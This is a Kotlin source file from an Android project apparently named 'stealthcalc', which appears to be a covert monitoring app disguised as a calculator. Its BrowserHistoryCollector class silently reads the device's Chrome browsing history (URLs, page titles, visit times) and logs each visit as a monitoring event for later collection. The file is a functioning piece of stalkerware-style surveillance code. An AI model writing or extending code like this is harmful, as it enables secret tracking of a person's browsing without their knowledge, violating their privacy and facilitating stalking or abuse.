package com.stealthcalc.monitoring.collector

import android.content.Context
import android.database.Cursor
import android.net.Uri
import com.stealthcalc.monitoring.data.MonitoringRepository
import com.stealthcalc.monitoring.model.BrowserHistoryPayload
import com.stealthcalc.monitoring.model.MonitoringEventKind
import dagger.hilt.android.qualifiers.ApplicationContext
import kotlinx.serialization.encodeToString
import kotlinx.serialization.json.Json
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class BrowserHistoryCollector @Inject constructor(
    @ApplicationContext private val context: Context,
    private val repository: MonitoringRepository,
) {
    private var lastVisitTime: Long = System.currentTimeMillis()

    suspend fun collect() {
        if (!repository.isMetricEnabled("browser_history")) return

        collectChrome()
    }

    private suspend fun collectChrome() {
        val uri = Uri.parse("content://com.android.chrome.browser/bookmarks")
        runCatching {
            val cursor: Cursor? = context.contentResolver.query(
                uri,
                arrayOf("url", "title", "date"),
                "date > ? AND bookmark = 0",
                arrayOf(lastVisitTime.toString()),
                "date ASC"
            )
            cursor?.use {
                while (it.moveToNext()) {
                    val url = it.getString(0) ?: continue
                    val title = it.getString(1)
                    val date = it.getLong(2)

                    val payload = Json.encodeToString(
                        BrowserHistoryPayload(
                            url = url,
                            title = title,
                            visitTime = date,
                            browser = "Chrome",
                        )
                    )
                    repository.recordEvent(MonitoringEventKind.BROWSER_HISTORY, payload)
                    if (date > lastVisitTime) lastVisitTime = date
                }
            }
        }
    }
}
